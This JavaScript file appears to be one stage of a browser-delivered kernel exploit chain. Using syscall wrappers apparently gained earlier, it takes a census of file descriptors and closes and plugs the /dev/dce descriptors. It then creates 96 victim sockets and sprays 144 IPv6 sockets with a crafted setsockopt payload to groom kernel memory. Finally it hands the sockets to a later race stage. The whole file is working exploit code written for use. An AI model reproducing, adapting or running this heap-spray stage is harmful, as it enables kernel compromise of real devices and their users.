// Stage B0 for the Hx1400 browser port: fd layout and spray.
//
// Mirrors Hx1400 Stage A/B exactly, except that nothing is armed here:
//
//   1. open("/dev/dce", O_RDWR), fstat, census fds 3..37 for character
//      devices whose st_ino matches the dce inode. Close those matches,
//      then plug each numeric fd with an inert device (none on this page).
//   2. warm open/close of /dev/dce so its fd number is reused next time.
//   3. create the anchor and 96 victim sockets (AF_INET, falling back to
//      AF_INET6 if the kernel refuses AF_INET).
//   4. spray 144 AF_INET6 sockets, each carrying the 248-byte
//      setsockopt(41,51) payload with MLO/MHI at +8/+12.
//
// On success the sockets stay open and are published as
// window.__fw14StageB for stage_c_race_v1. On any failure everything is
// closed again. No kevent filter is ever armed in this probe.
var result, n, f, dv, saved, phase = "preflight";
var dceFd = -1, plugFd = -1, anchor = -1;
var victims = [], spray = [];
var domain = 2;
try {
  n = window.__fw14NativeInvoke;
  var state = window.__fw14ArrayState;
  if (!n || !n.frame || !n.wrappers || !Number.isSafeInteger(n.frameAddress) ||
      !state || state.array[0] !== state.a)
    throw new Error("caller_missing");
  var need = ["open", "close", "sys97", "setsockopt", "getsockopt",
              "sys189", "getpid"];
  var missing = [];
  for (var mi = 0; mi < need.length; mi++)
    if (typeof n.wrappers[need[mi]] !== "number") missing.push(need[mi]);
  if (missing.length) throw new Error("wrappers_missing:" + missing.join(","));
  f = n.frame;
  if (f.length < 0x9020) throw new Error("frame_short");
  dv = new DataView(f.buffer, f.byteOffset, f.byteLength);
  saved = Array.from(f.subarray(0x200, 0x1000));

  function isErr(r) {
    return !!r && r.value === -1 && (r.high >>> 0) === 0xffffffff;
  }
  function errnoOf(r) { return isErr(r) ? n.readErrno() : null; }
  function eTag(r) {
    if (!isErr(r)) return "v" + r.value;
    var e = n.readErrno();
    return "e" + (e === null ? r.value : e);
  }
  function mark(m) {
    if (typeof api !== "undefined" && api && typeof api.markSync === "function")
      api.markSync(m);
  }
  function putStr(off, s) {
    for (var i = 0; i < s.length; i++) f[off + i] = s.charCodeAt(i) & 0xff;
    f[off + s.length] = 0;
  }
  function hex8(v) { return ("00000000" + (v >>> 0).toString(16)).slice(-8); }
  function closeAll() {
    if (plugFd >= 0) { try { n.call("close", [plugFd]); } catch (ignore) {} plugFd = -1; }
    if (dceFd >= 0) { try { n.call("close", [dceFd]); } catch (ignore) {} dceFd = -1; }
    while (victims.length) {
      var v = victims.pop();
      try { n.call("close", [v]); } catch (ignore) {}
    }
    while (spray.length) {
      var s = spray.pop();
      try { n.call("close", [s]); } catch (ignore) {}
    }
    if (anchor >= 0) { try { n.call("close", [anchor]); } catch (ignore) {} anchor = -1; }
  }
  function sock(d) {
    var r = n.call("sys97", [d, 2, 0]);
    return isErr(r) ? null : r.value;
  }
  function fstatInto(fd, off) {
    f.fill(0, off, off + 0x80);
    return n.call("sys189", [fd, n.frameAddress + off]);
  }

  var pidRes = n.call("getpid", []);
  if (pidRes.high !== 0 || pidRes.value < 1 || pidRes.value > 100000)
    throw new Error("pid_invalid");
  var pid = pidRes.value;

  // --------------------------------------------------------- census
  phase = "census";
  mark("b0_census");
  putStr(0x300, "/dev/dce");
  f.fill(0, 0x380, 0x3a0);
  var dres = n.call("open", [n.frameAddress + 0x300, 2, 0]);
  if (dres.value < 0) throw new Error("dce_open" + eTag(dres));
  dceFd = dres.value;
  var fs = fstatInto(dceFd, 0x400);
  if (fs.value !== 0) throw new Error("dce_fstat" + eTag(fs));
  var dceMode = dv.getUint16(0x408, true);
  var dceIno = dv.getUint32(0x404, true);
  var dceTag = "fd" + dceFd + "/mode=0x" + dceMode.toString(16) +
    "/ino=0x" + hex8(dceIno);

  var matches = [], openCount = 0, samples = [];
  for (var fd = 3; fd <= 37; fd++) {
    if (fd === dceFd) continue;
    var st = fstatInto(fd, 0x500);
    if (st.value !== 0) continue;
    openCount++;
    var m = dv.getUint16(0x508, true);
    var ino = dv.getUint32(0x504, true);
    if ((m & 0xf000) === 0x2000 && ino === dceIno && dceIno !== 0) {
      matches.push(fd);
      if (samples.length < 6) samples.push(fd + ":*" + hex8(ino));
    } else if (samples.length < 6) {
      samples.push(fd + ":0x" + m.toString(16) + ":" + hex8(ino));
    }
  }
  var censusTag = "open=" + openCount + "/match=" + matches.length +
    (samples.length ? "/" + samples.join(",") : "");
  n.call("close", [dceFd]);
  dceFd = -1;

  // close the app's own dce fds, then plug those numeric fds
  var closedCount = 0;
  for (var ci = 0; ci < matches.length; ci++)
    if (n.call("close", [matches[ci]]).value === 0) closedCount++;
  var plugName = "", plugged = 0;
  var plugNames = ["/dev/urandom", "/dev/random", "/dev/zero", "/dev/null"];
  for (var pi = 0; pi < plugNames.length; pi++) {
    putStr(0x300, plugNames[pi]);
    f.fill(0, 0x380, 0x3a0);
    var pr = n.call("open", [n.frameAddress + 0x300, 2, 0]);
    if (pr.value < 0) continue;
    plugName = plugNames[pi];
    n.call("close", [pr.value]);
    break;
  }
  if (plugName) {
    for (var pj = 0; pj < matches.length; pj++) {
      putStr(0x300, plugName);
      f.fill(0, 0x380, 0x3a0);
      var pp = n.call("open", [n.frameAddress + 0x300, 2, 0]);
      if (pp.value < 0) continue;
      plugFd = pp.value;
      if (pp.value === matches[pj]) plugged++;
    }
  }
  var plugTag = (plugName || "none") + "/closed=" + closedCount +
    "/plugged=" + plugged;

  // ------------------------------------------------------- warm dce
  phase = "warm";
  mark("b0_warm");
  putStr(0x300, "/dev/dce");
  f.fill(0, 0x380, 0x3a0);
  var warm = n.call("open", [n.frameAddress + 0x300, 2, 0]);
  var warmTag;
  if (warm.value >= 0) {
    warmTag = "open" + warm.value + "/close" +
      eTag(n.call("close", [warm.value]));
  } else {
    warmTag = "open" + eTag(warm);
  }

  // -------------------------------------------------- anchor+victims
  phase = "anchor";
  mark("b0_anchor");
  anchor = sock(2);
  if (anchor === null) { domain = 28; anchor = sock(28); }
  if (anchor === null) throw new Error("anchor_socket");
  for (var vi = 0; vi < 96; vi++) {
    var vfd = sock(domain);
    if (vfd === null) break;
    victims.push(vfd);
  }
  var anchorTag = "d" + domain + "/a" + anchor + "/v" + victims.length +
    (victims.length ? "/" + victims[0] + ".." + victims[victims.length - 1] : "");
  if (victims.length !== 96) throw new Error("victims_" + victims.length);

  // ------------------------------------------------------------ spray
  phase = "spray";
  mark("b0_spray");
  var LEN = 248;
  f.fill(0, 0x800, 0x800 + LEN);
  f[0x801] = 30;
  f[0x803] = 15;
  for (var k = 8; k + 8 <= LEN; k += 8) {
    dv.setUint32(0x800 + k, 0x43434343, true);
    dv.setUint32(0x800 + k + 4, 0x54545454, true);
  }
  var setFail = "";
  for (var si = 0; si < 144; si++) {
    var sfd = sock(28);
    if (sfd === null) { setFail = "sock" + eTag(n.call("sys97", [28, 2, 0])); break; }
    spray.push(sfd);
    var so = n.call("setsockopt",
      [sfd, 41, 51, n.frameAddress + 0x800, LEN, 0]);
    if (so.value !== 0) {
      setFail = "set" + eTag(so) + "@" + si + "/fd" + sfd;
      break;
    }
  }
  var sprayTag = "n=" + spray.length +
    (spray.length ? "/" + spray[0] + ".." + spray[spray.length - 1] : "") +
    (setFail ? "/fail=" + setFail : "");

  // read back first/middle/last to prove the payload is live
  function readOpt(fd) {
    f.fill(0, 0x700, 0x800);
    dv.setUint32(0x780, LEN, true);
    var g = n.call("getsockopt",
      [fd, 41, 51, n.frameAddress + 0x700, n.frameAddress + 0x780, 0]);
    if (g.value !== 0) return "g" + eTag(g);
    return "l" + dv.getUint32(0x780, true) + "/" +
      hex8(dv.getUint32(0x708, true)) + "/" +
      hex8(dv.getUint32(0x70c, true));
  }
  var rb = "none";
  if (spray.length >= 3) {
    rb = "a:" + readOpt(spray[0]) + ";m:" +
      readOpt(spray[(spray.length / 2) | 0]) + ";z:" +
      readOpt(spray[spray.length - 1]);
  }

  if (spray.length < 144) throw new Error("spray_" + spray.length);

  // publish for stage_c_race_v1
  window.__fw14StageB = {
    anchor: anchor,
    domain: domain,
    victims: victims.slice(),
    spray: spray.slice(),
    pid: pid
  };

  // ------------------------------------------------------------ done
  phase = "done";
  for (var ri = 0; ri < saved.length; ri++) f[0x200 + ri] = saved[ri];
  saved = null;
  var post = n.call("getpid", []);
  var intact = post.value === pid && post.high === 0 &&
    state.array[0] === state.a;

  result = {
    id: "stage_b0_anchor_v1",
    status: intact ? "pass" : "fail",
    details: {
      pid: pid,
      dce: dceTag,
      census: censusTag,
      plug: plugTag,
      warm: warmTag,
      anchor: anchorTag,
      spray: sprayTag,
      readback: rb,
      intact: intact
    }
  };
} catch (e) {
  try { if (n) closeAll(); } catch (ignore) {}
  result = {
    id: "stage_b0_anchor_v1",
    status: "error",
    details: { phase: phase, error: String(e).slice(0, 200) }
  };
} finally {
  if (f && saved)
    for (var fi = 0; fi < saved.length; fi++) f[0x200 + fi] = saved[fi];
}
return [result];
